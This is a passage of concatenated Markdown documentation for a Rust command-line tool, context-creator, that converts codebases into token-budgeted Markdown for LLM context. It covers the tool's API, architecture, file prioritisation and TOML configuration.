â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  LLM Integrationâ”‚â—€â”€â”€â”€â”‚   Markdown Gen   â”‚â—€â”€â”€â”€â”‚ File Prioritizerâ”‚
â”‚ (gemini/codex)  â”‚    â”‚   (templates)    â”‚    â”‚ (tiktoken-rs)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## Performance Characteristics

| Metric | Performance |
|--------|-------------|
| Directory Walking | 160-276K files/sec |
| Token Counting | 680MB/s - 1.6GB/s |
| File Prioritization | 10K files/sec |
| Markdown Generation | 80K files/sec |
| End-to-End | 2.4K files/sec |
| Parallel Speedup | ~40% improvement |

## Supported Languages

| Language | Extension | Priority | Notes |
|----------|-----------|----------|--------|
| Rust | `.rs` | High | Native optimization |
| Python | `.py` | High | Complete support |
| JavaScript | `.js` | High | ES6+ features |
| TypeScript | `.ts`, `.tsx` | High | Full type support |
| Go | `.go` | Medium | Standard library aware |
| Java | `.java` | Medium | Package structure |
| C++ | `.cpp`, `.hpp` | Medium | Header handling |
| C | `.c`, `.h` | Medium | Include processing |
| C# | `.cs` | Medium | Namespace support |
| Ruby | `.rb` | Medium | Gem structure |
| PHP | `.php` | Medium | Framework aware |
| Swift | `.swift` | Medium | iOS/macOS focus |
| Kotlin | `.kt` | Medium | Android support |
| Scala | `.scala` | Medium | JVM integration |
| Haskell | `.hs` | Medium | Functional focus |
| Markdown | `.md` | Low | Documentation |
| JSON | `.json` | Low | Configuration |
| YAML | `.yml`, `.yaml` | Low | Configuration |
| TOML | `.toml` | Low | Configuration |
| XML | `.xml` | Low | Data format |
| HTML | `.html` | Low | Web content |
| CSS | `.css` | Low | Styling |

## Project Status

- âœ… **Core Features**: Complete
- âœ… **Testing**: 77 tests, 100% critical path coverage
- âœ… **Performance**: Optimized and benchmarked
- âœ… **Documentation**: Comprehensive guides
- âœ… **CI/CD**: GitHub Actions pipeline
- ðŸš§ **Examples**: In progress
- ðŸš§ **Release**: Preparing v1.0.0

## Community & Support

- **Issues**: [GitHub Issues](https://github.com/matiasvillaverde/context-creator/issues)
- **Discussions**: [GitHub Discussions](https://github.com/matiasvillaverde/context-creator/discussions)
- **Contributing**: See [CONTRIBUTING.md](../CONTRIBUTING.md)
- **License**: MIT License

## What's Next?

- ðŸ“¦ Package distribution (Homebrew, apt, etc.)
- ðŸ”Œ Plugin system for custom processors
- ðŸŽ¨ Template system for custom output formats
- ðŸ”„ Watch mode for continuous processing
- ðŸŒ Web interface for team collaboration
- ðŸ“Š Analytics and usage insights
```

## docs/api.md

```markdown
# API Reference

Complete API reference for using context-creator programmatically and integrating it into other applications.

## Library Usage

### Basic Library Integration

```rust
use code_context::{Config, run};
use std::path::PathBuf;

fn main() -> anyhow::Result<()> {
    // Create configuration
    let config = Config {
        directory: PathBuf::from("/path/to/project"),
        output_file: Some(PathBuf::from("output.md")),
        max_tokens: Some(50000),
        progress: true,
        verbose: false,
        quiet: false,
        llm_tool: code_context::cli::LlmTool::Gemini,
        config: None,
        prompt: None,
    };
    
    // Run context-creator
    run(config)?;
    
    Ok(())
}
```

### Advanced Configuration

```rust
use code_context::{
    Config,
    core::{
        context::{contextOptions, generate_markdown},
        walker::{WalkOptions, walk_directory},
        prioritizer::prioritize_files,
    },
};

fn advanced_usage() -> anyhow::Result<()> {
    let directory = PathBuf::from("/path/to/project");
    
    // Configure directory walking
    let walk_options = WalkOptions {
        follow_symlinks: false,
        ignore_patterns: vec![
            "target/".to_string(),
            "node_modules/".to_string(),
        ],
        include_patterns: vec![
            "src/**/*.rs".to_string(),
        ],
        max_depth: Some(10),
        max_file_size: Some(1024 * 1024), // 1MB
    };
    
    // Walk directory
    let files = walk_directory(&directory, walk_options)?;
    
    // Configure context generation
    let context_options = contextOptions {
        max_tokens: Some(50000),
        include_tree: true,
        include_stats: true,
        group_by_type: false,
        sort_by_priority: true,
        file_header_template: "## {path}".to_string(),
        doc_header_template: "# Code Analysis".to_string(),
        include_toc: true,
    };
    
    // Prioritize files based on token limits
    let prioritized_files = prioritize_files(files, &context_options)?;
    
    // Generate markdown
    let markdown = generate_markdown(prioritized_files, context_options)?;
    
    // Write output
    std::fs::write("analysis.md", markdown)?;
    
    Ok(())
}
```

## Core Types

### Config

Main configuration structure for context-creator.

```rust
pub struct Config {
    /// The prompt to send to the LLM
    pub prompt: Option<String>,
    
    /// The path to the directory to process
    pub directory: PathBuf,
    
    /// The path to the output Markdown file
    pub output_file: Option<PathBuf>,
    
    /// Maximum number of tokens for the generated context
    pub max_tokens: Option<usize>,
    
    /// LLM CLI tool to use for processing
    pub llm_tool: LlmTool,
    
    /// Suppress all output except for errors
    pub quiet: bool,
    
    /// Enable verbose logging
    pub verbose: bool,
    
    /// Path to configuration file
    pub config: Option<PathBuf>,
    
    /// Show progress indicators during processing
    pub progress: bool,
}

impl Config {
    /// Validate the configuration
    pub fn validate(&self) -> Result<(), CodecontextError>;
    
    /// Load configuration from file if specified
    pub fn load_from_file(&mut self) -> Result<(), CodecontextError>;
}
```

### LlmTool

Enumeration of supported LLM CLI tools.

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LlmTool {
    /// Use gemini (default)
    Gemini,
    /// Use codex CLI
    Codex,
}

impl LlmTool {
    /// Get the command name for the tool
    pub fn command(&self) -> &'static str;
    
    /// Get the installation instructions for the tool
    pub fn install_instructions(&self) -> &'static str;
}
```

### WalkOptions

Configuration for directory traversal.

```rust
pub struct WalkOptions {
    /// Follow symbolic links
    pub follow_symlinks: bool,
    
    /// Patterns to ignore (glob format)
    pub ignore_patterns: Vec<String>,
    
    /// Patterns to include (overrides ignore)
    pub include_patterns: Vec<String>,
    
    /// Maximum directory depth
    pub max_depth: Option<usize>,
    
    /// Maximum file size to process (bytes)
    pub max_file_size: Option<u64>,
}

impl WalkOptions {
    /// Create WalkOptions from CLI config
    pub fn from_config(config: &Config) -> Result<Self>;
}

impl Default for WalkOptions {
    fn default() -> Self;
}
```

### contextOptions

Configuration for markdown generation.

```rust
pub struct contextOptions {
    /// Maximum tokens allowed in the output
    pub max_tokens: Option<usize>,
    
    /// Include file tree in output
    pub include_tree: bool,
    
    /// Include token count statistics
    pub include_stats: bool,
    
    /// Group files by type
    pub group_by_type: bool,
    
    /// Sort files by priority
    pub sort_by_priority: bool,
    
    /// Template for file headers
    pub file_header_template: String,
    
    /// Template for the document header
    pub doc_header_template: String,
    
    /// Include table of contents
    pub include_toc: bool,
}

impl contextOptions {
    /// Create contextOptions from CLI config
    pub fn from_config(config: &Config) -> Result<Self>;
}

impl Default for contextOptions {
    fn default() -> Self;
}
```

### FileInfo

Information about a discovered file.

```rust
pub struct FileInfo {
    /// Absolute path to the file
    pub path: PathBuf,
    
    /// Relative path from the root directory
    pub relative_path: PathBuf,
    
    /// File size in bytes
    pub size: u64,
    
    /// Detected file type
    pub file_type: FileType,
    
    /// Priority score for this file
    pub priority: f64,
}

impl FileInfo {
    /// Get display name for file type
    pub fn file_type_display(&self) -> &'static str;
}
```

### FileType

Enumeration of supported file types.

```rust
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum FileType {
    Rust,
    Python,
    JavaScript,
    TypeScript,
    Go,
    Java,
    Cpp,
    C,
    CSharp,
    Ruby,
    Php,
    Swift,
    Kotlin,
    Scala,
    Haskell,
    Markdown,
    Json,
    Yaml,
    Toml,
    Xml,
    Html,
    Css,
    Text,
    Other,
}
```

## Core Functions

### Directory Walking

```rust
/// Walk a directory and return information about discovered files
pub fn walk_directory(
    path: &Path,
    options: WalkOptions,
) -> Result<Vec<FileInfo>>;
```

**Example**:

```rust
use code_context::core::walker::{walk_directory, WalkOptions};
use std::path::Path;

let options = WalkOptions {
    ignore_patterns: vec!["target/".to_string()],
    ..Default::default()
};

let files = walk_directory(Path::new("/project"), options)?;
println!("Found {} files", files.len());
```

### File Prioritization

```rust
/// Prioritize files based on their importance and token limits
pub fn prioritize_files(
    files: Vec<FileInfo>,
    options: &contextOptions,
) -> Result<Vec<FileInfo>>;
```

**Example**:

```rust
use code_context::core::prioritizer::prioritize_files;
use code_context::core::context::contextOptions;

let options = contextOptions {
    max_tokens: Some(50000),
    sort_by_priority: true,
    ..Default::default()
};

let prioritized = prioritize_files(files, &options)?;
println!("Selected {} files after prioritization", prioritized.len());
```

### Markdown Generation

```rust
/// Generate markdown from a list of files
pub fn generate_markdown(
    files: Vec<FileInfo>,
    options: contextOptions,
) -> Result<String>;
```

**Example**:

```rust
use code_context::core::context::{generate_markdown, contextOptions};

let options = contextOptions {
    include_tree: true,
    include_stats: true,
    include_toc: true,
    file_header_template: "## {path}".to_string(),
    doc_header_template: "# Project Analysis".to_string(),
    ..Default::default()
};

let markdown = generate_markdown(files, options)?;
std::fs::write("output.md", markdown)?;
```

### Token Counting

```rust
use code_context::core::token::TokenCounter;

/// High-level token counting functions
pub fn count_tokens(text: &str) -> Result<usize>;
pub fn count_file_tokens(path: &Path) -> Result<usize>;

/// Token counter with caching
pub struct TokenCounter {
    pub fn new() -> Result<Self>;
    pub fn count_tokens(&self, text: &str) -> Result<usize>;
    pub fn count_file_tokens(&self, content: &str, path: &str) -> Result<FileTokenCount>;
    pub fn count_tokens_parallel(&self, texts: &[String]) -> Result<Vec<usize>>;
}
```

**Example**:

```rust
use code_context::core::token::{TokenCounter, count_tokens};

// Simple token counting
let count = count_tokens("Hello, world!")?;
println!("Tokens: {}", count);

// Advanced token counting with caching
let counter = TokenCounter::new()?;
let count = counter.count_tokens("println!(\"Hello, world!\");")?;
println!("Rust code tokens: {}", count);

// Parallel token counting
let texts = vec!["text1".to_string(), "text2".to_string()];
let counts = counter.count_tokens_parallel(&texts)?;
```

## Configuration API

### Configuration Loading

```rust
use code_context::config::{ConfigFile, Priority};

/// Load configuration from TOML file
let config = ConfigFile::load_from_file("config.toml")?;

/// Load from default locations
let config = ConfigFile::load_default()?;

/// Apply configuration to CLI config
config.apply_to_cli_config(&mut cli_config);
```

### Configuration Structure

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConfigFile {
    #[serde(default)]
    pub defaults: Defaults,
    
    #[serde(default)]
    pub priorities: Vec<Priority>,
    
    #[serde(default)]
    pub ignore: Vec<String>,
    
    #[serde(default)]
    pub include: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Defaults {
    pub max_tokens: Option<usize>,
    pub progress: Option<bool>,
    pub verbose: Option<bool>,
    pub quiet: Option<bool>,
    pub tool: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Priority {
    pub pattern: String,
    pub weight: f64,
    pub description: Option<String>,
}
```

## Error Handling

### Error Types

```rust
#[derive(Debug, thiserror::Error)]
pub enum CodecontextError {
    #[error("Invalid path: {0}")]
    InvalidPath(String),
    
    #[error("Invalid configuration: {0}")]
    InvalidConfiguration(String),
    
    #[error("File processing error: {0}")]
    FileProcessing(String),
    
    #[error("Token counting error: {0}")]
    TokenCounting(String),
    
    #[error("LLM tool not found: {tool}. {install_instructions}")]
    LlmToolNotFound {
        tool: String,
        install_instructions: String,
    },
    
    #[error("Subprocess error: {0}")]
    SubprocessError(String),
    
    #[error("Configuration error: {0}")]
    ConfigError(String),
    
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
}
```

### Error Handling Examples

```rust
use code_context::{run, Config, CodecontextError};

fn handle_errors() -> anyhow::Result<()> {
    let config = Config::default();
    
    match run(config) {
        Ok(()) => println!("Success!"),
        Err(e) => {
            match e.downcast_ref::<CodecontextError>() {
                Some(CodecontextError::LlmToolNotFound { tool, install_instructions }) => {
                    eprintln!("LLM tool '{}' not found.", tool);
                    eprintln!("Install instructions: {}", install_instructions);
                },
                Some(CodecontextError::InvalidPath(path)) => {
                    eprintln!("Invalid path: {}", path);
                },
                Some(CodecontextError::TokenCounting(msg)) => {
                    eprintln!("Token counting failed: {}", msg);
                },
                _ => {
                    eprintln!("Error: {}", e);
                }
            }
        }
    }
    
    Ok(())
}
```

## Utility Functions

### File Type Detection

```rust
use code_context::utils::file_ext::{detect_file_type, is_binary_file};

/// Detect file type from path
let file_type = detect_file_type(Path::new("src/main.rs"));
println!("File type: {:?}", file_type);

/// Check if file is binary
let is_binary = is_binary_file(Path::new("image.png"));
println!("Is binary: {}", is_binary);
```

### Pattern Matching

```rust
use code_context::utils::patterns::{matches_pattern, compile_patterns};

/// Test if path matches glob pattern
let matches = matches_pattern("src/main.rs", "src/**/*.rs");
println!("Matches: {}", matches);

/// Compile multiple patterns for efficient matching
let patterns = compile_patterns(&["*.rs", "*.toml"])?;
let matches = patterns.is_match("Cargo.toml");
```

## Integration Examples

### Custom CLI Tool

```rust
use clap::{Parser, Subcommand};
use code_context::{Config, run};

#[derive(Parser)]
#[command(name = "my-analyzer")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Analyze {
        #[arg(short, long)]
        directory: PathBuf,
        
        #[arg(short, long)]
        output: Option<PathBuf>,
        
        #[arg(long)]
        max_tokens: Option<usize>,
    },
}

fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();
    
    match cli.command {
        Commands::Analyze { directory, output, max_tokens } => {
            let config = Config {
                directory,
                output_file: output,
                max_tokens,
                progress: true,
                verbose: false,
                quiet: false,
                llm_tool: code_context::cli::LlmTool::Gemini,
                config: None,
                prompt: None,
            };
            
            run(config)?;
        }
    }
    
    Ok(())
}
```

### Web Service Integration

```rust
use axum::{extract::Query, http::StatusCode, response::Json, routing::get, Router};
use serde::{Deserialize, Serialize};
use code_context::{Config, run};

#[derive(Deserialize)]
struct AnalyzeRequest {
    directory: String,
    max_tokens: Option<usize>,
}

#[derive(Serialize)]
struct AnalyzeResponse {
    success: bool,
    markdown: Option<String>,
    error: Option<String>,
}

async fn analyze_endpoint(Query(params): Query<AnalyzeRequest>) -> Json<AnalyzeResponse> {
    let config = Config {
        directory: params.directory.into(),
        output_file: None,
        max_tokens: params.max_tokens,
        progress: false,
        verbose: false,
        quiet: true,
        llm_tool: code_context::cli::LlmTool::Gemini,
        config: None,
        prompt: None,
    };
    
    match run_and_capture_output(config) {
        Ok(markdown) => Json(AnalyzeResponse {
            success: true,
            markdown: Some(markdown),
            error: None,
        }),
        Err(e) => Json(AnalyzeResponse {
            success: false,
            markdown: None,
            error: Some(e.to_string()),
        }),
    }
}

#[tokio::main]
async fn main() {
    let app = Router::new()
        .route("/analyze", get(analyze_endpoint));
    
    axum::Server::bind(&"0.0.0.0:3000".parse().unwrap())
        .serve(app.into_make_service())
        .await
        .unwrap();
}
```

### Async Integration

```rust
use tokio::task;
use code_context::{Config, run};

async fn async_analysis(directory: PathBuf) -> anyhow::Result<String> {
    // Run context-creator in a blocking task
    let config = Config {
        directory,
        output_file: None,
        max_tokens: Some(50000),
        progress: false,
        verbose: false,
        quiet: true,
        llm_tool: code_context::cli::LlmTool::Gemini,
        config: None,
        prompt: None,
    };
    
    let markdown = task::spawn_blocking(move || {
        // Capture output instead of writing to file
        run_and_capture_output(config)
    }).await??;
    
    Ok(markdown)
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let directories = vec![
        PathBuf::from("/project1"),
        PathBuf::from("/project2"),
        PathBuf::from("/project3"),
    ];
    
    // Process multiple directories concurrently
    let tasks: Vec<_> = directories.into_iter()
        .map(|dir| async_analysis(dir))
        .collect();
    
    let results = futures::future::try_join_all(tasks).await?;
    
    for (i, markdown) in results.iter().enumerate() {
        println!("Project {} analysis: {} characters", i + 1, markdown.len());
    }
    
    Ok(())
}
```

## Testing Integration

### Unit Testing

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;
    use std::fs;
    
    #[test]
    fn test_directory_analysis() -> anyhow::Result<()> {
        // Create temporary project
        let temp_dir = TempDir::new()?;
        let project_dir = temp_dir.path().join("test_project");
        fs::create_dir_all(&project_dir)?;
        
        // Create test files
        fs::write(project_dir.join("main.rs"), r#"
            fn main() {
                println!("Hello, world!");
            }
        "#)?;
        
        fs::write(project_dir.join("lib.rs"), r#"
            pub fn add(a: i32, b: i32) -> i32 {
                a + b
            }
        "#)?;
        
        // Run analysis
        let config = Config {
            directory: project_dir,
            output_file: None,
            max_tokens: Some(10000),
            progress: false,
            verbose: false,
            quiet: true,
            llm_tool: code_context::cli::LlmTool::Gemini,
            config: None,
            prompt: None,
        };
        
        let markdown = run_and_capture_output(config)?;
        
        // Verify output
        assert!(markdown.contains("# Code context"));
        assert!(markdown.contains("main.rs"));
        assert!(markdown.contains("lib.rs"));
        assert!(markdown.contains("Hello, world!"));
        
        Ok(())
    }
}
```

### Benchmark Testing

```rust
use criterion::{black_box, criterion_group, criterion_main, Criterion};
use code_context::{Config, run_and_capture_output};

fn benchmark_analysis(c: &mut Criterion) {
    let config = Config {
        directory: PathBuf::from("test-project"),
        output_file: None,
        max_tokens: Some(50000),
        progress: false,
        verbose: false,
        quiet: true,
        llm_tool: code_context::cli::LlmTool::Gemini,
        config: None,
        prompt: None,
    };
    
    c.bench_function("project analysis", |b| {
        b.iter(|| {
            black_box(run_and_capture_output(black_box(config.clone())).unwrap());
        });
    });
}

criterion_group!(benches, benchmark_analysis);
criterion_main!(benches);
```

## Performance Considerations

### Memory Management

```rust
use code_context::core::walker::WalkOptions;

// For large projects, use streaming approach
let walk_options = WalkOptions {
    max_file_size: Some(1024 * 1024), // 1MB limit per file
    ..Default::default()
};

// Process files in chunks
const CHUNK_SIZE: usize = 100;
for chunk in files.chunks(CHUNK_SIZE) {
    let markdown = generate_markdown(chunk.to_vec(), options.clone())?;
    // Process chunk...
}
```

### Parallel Processing

```rust
use rayon::prelude::*;
use code_context::core::token::TokenCounter;

// Parallel token counting
let counter = TokenCounter::new()?;
let token_counts: Vec<usize> = files
    .par_iter()
    .map(|file| {
        let content = std::fs::read_to_string(&file.path)?;
        counter.count_tokens(&content)
    })
    .collect::<Result<Vec<_>, _>>()?;
```

### Caching

```rust
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

// Simple caching example
type Cache = Arc<Mutex<HashMap<PathBuf, String>>>;

fn cached_analysis(path: &Path, cache: Cache) -> anyhow::Result<String> {
    // Check cache first
    if let Ok(cache_guard) = cache.lock() {
        if let Some(cached) = cache_guard.get(path) {
            return Ok(cached.clone());
        }
    }
    
    // Generate analysis
    let config = Config {
        directory: path.to_path_buf(),
        // ... other config
    };
    
    let result = run_and_capture_output(config)?;
    
    // Store in cache
    if let Ok(mut cache_guard) = cache.lock() {
        cache_guard.insert(path.to_path_buf(), result.clone());
    }
    
    Ok(result)
}
```

This API reference provides comprehensive documentation for integrating context-creator into other applications and using it programmatically.
```

## docs/architecture.md

```markdown
# Architecture Overview

This document describes the high-level architecture of `context-creator`, a high-performance CLI tool for converting codebases to Markdown for LLM context.

## Design Principles

1. **Performance First**: Leverage Rust's performance characteristics and parallel processing
2. **Modularity**: Clear separation of concerns with focused modules
3. **Extensibility**: Easy to add new features without breaking existing functionality
4. **User Experience**: Clear error messages and intuitive CLI interface
5. **LLM Optimization**: Output specifically designed for LLM consumption

## System Architecture

```mermaid
graph TD
    A[CLI Entry Point] --> B[Configuration Parser]
    B --> C[Directory Walker]
    C --> D[File Filter]
    D --> E[File Reader]
    E --> F[Token Counter]
    F --> G[File Prioritizer]
    G --> H[Markdown Generator]
    H --> I{Output Handler}
    I --> J[File Writer]
    I --> K[Stdout]
    I --> L[Gemini CLI]
```

## Core Components

### 1. CLI Interface (`src/cli.rs`)

**Responsibilities:**
- Parse command-line arguments using `clap`
- Load and merge configuration from files
- Validate user input
- Provide help and usage information

**Key Design Decisions:**
- Use derive macros for clean argument definition
- Support both positional arguments and flags
- Allow configuration via file for complex setups

### 2. Directory Walker (`src/core/walker.rs`)

**Responsibilities:**
- Traverse directory structures efficiently
- Apply ignore patterns from `.gitignore` and `.contextignore`
- Handle symbolic links safely
- Detect and skip binary files

**Key Design Decisions:**
- Use `ignore` crate for Git-aware traversal
- Parallel directory scanning with `rayon`
- Stream files rather than collecting all at once
- Skip binary files by detecting null bytes

### 3. Token Counter (`src/core/token.rs`)

**Responsibilities:**
- Count tokens accurately using tiktoken
- Cache token counts for performance
- Support different tokenizer models
- Handle large files efficiently

**Key Design Decisions:**
- Default to cl100k_base encoding (GPT-3.5/4)
- Lazy loading of tokenizer data
- Chunked processing for large files
- Thread-safe caching with `DashMap`

### 4. File Prioritizer (`src/core/prioritizer.rs`)

**Responsibilities:**
- Score files based on importance
- Apply user-defined priority rules
- Ensure essential files are included first
- Handle token budget allocation

**Key Design Decisions:**
- Glob pattern matching for flexibility
- Weight-based scoring system
- Two-pass algorithm: collect then prioritize
- Support for `.contextkeep` essential files

### 5. Markdown Generator (`src/core/context.rs`)

**Responsibilities:**
- Format files into structured Markdown
- Add appropriate code fence languages
- Generate project structure overview
- Handle special file types

**Key Design Decisions:**
- Include file tree at the beginning
- Use consistent formatting throughout
- Preserve file paths for context
- Support syntax highlighting hints

## Data Flow

1. **Input Phase**
   - CLI arguments parsed
   - Configuration loaded and merged
   - Target directory validated

2. **Discovery Phase**
   - Directory tree traversed
   - Ignore patterns applied
   - Binary files filtered out
   - File metadata collected

3. **Analysis Phase**
   - Files read in parallel
   - Tokens counted per file
   - Priority scores calculated
   - Files sorted by importance

4. **Generation Phase**
   - Project structure generated
   - Files processed in priority order
   - Markdown formatted with syntax hints
   - Token budget tracked

5. **Output Phase**
   - Output directed to appropriate target
   - Progress reported if requested
   - Errors handled gracefully

## Performance Optimizations

### Parallel Processing
- Directory traversal parallelized with `rayon`
- File reading done concurrently
- Token counting distributed across threads

### Memory Efficiency
- Streaming file processing
- Bounded channels for backpressure
- Incremental markdown building
- Smart caching strategies

### I/O Optimization
- Buffered file reading
- Batch writes for output
- Minimal stat calls
- Efficient path handling

## Error Handling Strategy

### Error Types
```rust
pub enum CodecontextError {
    // File system errors
    InvalidPath(String),
    ReadError(String),
    
    // Configuration errors
    InvalidConfiguration(String),
    ConfigParseError(String),
    
    // Processing errors
    TokenCountError(String),
    MarkdownGenerationError(String),
    
    // External tool errors
    GeminiNotFound,
    SubprocessError(String),
}
```

### Error Propagation
- Use `Result<T, CodecontextError>` throughout
- Convert external errors at boundaries
- Provide context with error messages
- Fail fast for unrecoverable errors

## Extension Points

### Adding New File Types
1. Update `file_ext.rs` with mappings
2. Add special handling in `context.rs` if needed
3. Update prioritization weights

### Supporting New LLMs
1. Add tokenizer support in `token.rs`
2. Update CLI to select tokenizer
3. Adjust output format if needed

### Custom Processors
1. Define processor trait
2. Implement for specific file types
3. Register in processing pipeline

## Configuration System

### Precedence Order
1. CLI arguments (highest)
2. Project config file (`.context-creator.toml`)
3. User config file (`~/.config/context-creator/config.toml`)
4. Default values (lowest)

### Configuration Schema
```toml
[defaults]
max_tokens = 150000
verbose = false
progress = true

[ignore]
patterns = ["*.log", "*.tmp"]
use_gitignore = true

[[priorities]]
pattern = "**/*.rs"
weight = 100

[output]
include_tree = true
syntax_highlighting = true
```

## Security Considerations

### Path Traversal
- Validate all paths are within project root
- Don't follow symbolic links by default
- Sanitize file paths in output

### Resource Limits
- Cap maximum file size
- Limit total files processed
- Timeout long operations

### External Commands
- Validate gemini presence
- Sanitize inputs to subprocesses
- Handle subprocess failures gracefully

## Testing Strategy

### Unit Tests
- Test each module in isolation
- Mock file system operations
- Verify error handling paths

### Integration Tests
- Test full processing pipeline
- Use fixture directories
- Verify output correctness

### Performance Tests
- Benchmark large repositories
- Profile memory usage
- Track performance regressions

## Future Enhancements

### Near Term
- Progress bars with `indicatif`
- Colored output with `termcolor`
- Config file watching
- Incremental processing

### Long Term
- Web UI for configuration
- Plugin system for processors
- Cloud storage integration
- Distributed processing

## Dependencies Overview

### Core Dependencies
- `clap` - CLI argument parsing
- `ignore` - Git-aware file traversal
- `tiktoken-rs` - Token counting
- `rayon` - Parallel processing

### Error Handling
- `anyhow` - Error propagation
- `thiserror` - Error definitions

### Utilities
- `walkdir` - Directory traversal (via ignore)
- `once_cell` - Lazy statics
- `serde` - Configuration parsing

## Conclusion

The architecture of `context-creator` is designed to be:
- **Fast**: Parallel processing and efficient algorithms
- **Flexible**: Easy to extend and configure
- **Reliable**: Comprehensive error handling
- **User-friendly**: Clear output and helpful errors

This design allows the tool to handle large codebases efficiently while producing high-quality output for LLM consumption.
```

## docs/configuration.md

```markdown
# Configuration Reference

Complete reference for configuring context-creator through TOML files, environment variables, and command-line arguments.

## Configuration Hierarchy

context-creator uses the following configuration precedence (highest to lowest):

1. **Command-line arguments** (highest priority)
2. **Environment variables**
3. **Project configuration file** (`.context-creator.toml`)
4. **User configuration file** (`~/.config/context-creator/config.toml`)
5. **System configuration file** (`/etc/context-creator/config.toml`)
6. **Built-in defaults** (lowest priority)

## Configuration File Locations

### Auto-discovery Order

context-creator automatically searches for configuration files in this order:

```bash
# 1. Current directory
./.context-creator.toml
./context-creator.toml

# 2. User config directory
~/.config/context-creator/config.toml
~/.config/context-creator.toml

# 3. System config directory (Linux/macOS)
/etc/context-creator/config.toml

# 4. Windows AppData
%APPDATA%\context-creator\config.toml
```

### Explicit Configuration

```bash
# Use specific config file
context-creator -c /path/to/config.toml

# Use specific config with environment variable
export CODE_context_CONFIG="/path/to/config.toml"
context-creator
```

## Configuration File Format

### Complete Example

```toml
# Complete configuration example
# ~/.config/context-creator/config.toml

[defaults]
max_tokens = 50000
progress = true
verbose = false
quiet = false
tool = "gemini"
include_tree = true
include_stats = true
include_toc = true
group_by_type = false
sort_by_priority = true

[format]
file_header_template = "## {path}"
doc_header_template = "# Code context: {directory}"

[processing]
parallel_jobs = 0  # 0 = auto-detect CPU cores
chunk_size = 1000
timeout_seconds = 300

[cache]
enabled = true
directory = "~/.cache/context-creator"
max_size_mb = 1024
ttl_hours = 24

# Global ignore patterns (applied to all projects)
ignore = [
    ".git/",
    ".svn/",
    ".hg/",
    "node_modules/",
    "target/",
    "dist/",
    "build/",
    "__pycache__/",
    "*.pyc",
    "*.pyo",
    "*.pyd",
    "*.so",
    "*.dylib",
    "*.dll",
    "*.exe",
    "*.o",
    "*.obj",
    "*.class",
    "*.jar",
    "*.war",
    "*.ear",
    "*.zip",
    "*.tar.gz",
    "*.tar.bz2",
    "*.rar",
    "*.7z",
    "*.log",
    "*.tmp",
    "*.temp",
    "*.cache",
    ".DS_Store",
    "Thumbs.db",
    "*.swp",
    "*.swo",
    "*~"
]

# Global include patterns (overrides ignore)
include = [
    "src/**/*",
    "lib/**/*",
    "*.md",
    "*.toml",
    "*.yaml",
    "*.yml",
    "*.json",
    "Makefile",
    "Dockerfile",
    "*.dockerfile"
]

# File type priorities (higher = more important)
[[priorities]]
pattern = "src/main.*"
weight = 200.0
description = "Main entry points"

[[priorities]]
pattern = "src/lib.*"
weight = 180.0
description = "Library roots"

[[priorities]]
pattern = "*.rs"
weight = 150.0
description = "Rust source files"

[[priorities]]
pattern = "*.py"
weight = 140.0
description = "Python source files"

[[priorities]]
pattern = "*.js"
weight = 130.0
description = "JavaScript source files"

[[priorities]]
pattern = "*.ts"
weight = 130.0
description = "TypeScript source files"

[[priorities]]
pattern = "*.go"
weight = 120.0
description = "Go source files"

[[priorities]]
pattern = "*.java"
weight = 110.0
description = "Java source files"

[[priorities]]
pattern = "*.cpp"
weight = 110.0
description = "C++ source files"

[[priorities]]
pattern = "*.c"
weight = 100.0
description = "C source files"

[[priorities]]
pattern = "*.toml"
weight = 90.0
description = "Configuration files"

[[priorities]]
pattern = "*.yaml"
weight = 80.0
description = "YAML configuration"

[[priorities]]
pattern = "*.yml"
weight = 80.0
description = "YAML configuration"

[[priorities]]
pattern = "*.json"
weight = 70.0
description = "JSON configuration"

[[priorities]]
pattern = "README.*"
weight = 60.0
description = "README files"

[[priorities]]
pattern = "*.md"
weight = 50.0
description = "Markdown documentation"

[[priorities]]
pattern = "tests/**/*"
weight = 30.0
description = "Test files"

[[priorities]]
pattern = "docs/**/*"
weight = 20.0
description = "Documentation files"

# LLM tool configurations
[tools.gemini]
command = "gemini"
args = ["--format", "markdown"]
timeout = 60
max_retries = 3

[tools.codex]
command = "codex"
args = ["--temperature", "0.1"]
timeout = 120
max_retries = 2

[tools.claude]
command = "claude"
args = ["--model", "claude-3-sonnet"]
timeout = 90
max_retries = 3

# Project-specific overrides
[projects]

[projects."~/work/rust-project"]
max_tokens = 100000
ignore = ["target/", "benches/"]

[projects."~/work/js-project"]
max_tokens = 75000
ignore = ["node_modules/", "dist/"]
tool = "codex"

[projects."/opt/legacy-code"]
max_tokens = 25000
verbose = true
progress = true
```

## Configuration Sections

### [defaults]

Default values for command-line options:

```toml
[defaults]
# Maximum tokens in output (0 = unlimited)
max_tokens = 50000

# Show progress indicators
progress = true

# Enable verbose logging
verbose = false

# Suppress all non-error output
quiet = false

# Default LLM tool
tool = "gemini"

# Include file tree in output
include_tree = true

# Include statistics section
include_stats = true

# Include table of contents
include_toc = true

# Group files by type
group_by_type = false

# Sort files by priority
sort_by_priority = true
```

### [format]

Output formatting templates:

```toml
[format]
# Template for file headers (supports {path}, {name}, {ext})
file_header_template = "## {path}"

# Template for document header (supports {directory}, {date}, {time})
